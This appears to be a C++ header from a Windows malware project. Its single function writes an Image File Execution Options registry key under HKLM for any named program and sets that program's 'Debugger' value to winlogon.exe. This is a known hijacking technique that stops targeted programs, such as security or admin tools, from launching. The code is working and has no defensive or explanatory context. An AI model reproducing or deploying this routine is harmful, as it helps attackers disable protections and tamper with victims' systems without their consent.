#pragma once
#include <iostream>
#include <Windows.h>
HANDLE hHeap = GetProcessHeap();
void SetImageFileExecution(LPCWSTR lpProgramName)
{
	LPWSTR wRegPath = (LPWSTR)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (MAX_PATH + 1) * sizeof(WCHAR));
	lstrcpyW(wRegPath, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\");
	lstrcatW(wRegPath, lpProgramName);

	HKEY hKey;
	LPCWSTR lpData = L"winlogon.exe";
	RegCreateKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (LPBYTE)lpData, (lstrlenW(lpData) + 1) * sizeof(WCHAR));

	}
	RegCloseKey(hKey);
	HeapFree(hHeap, NULL, wRegPath);
}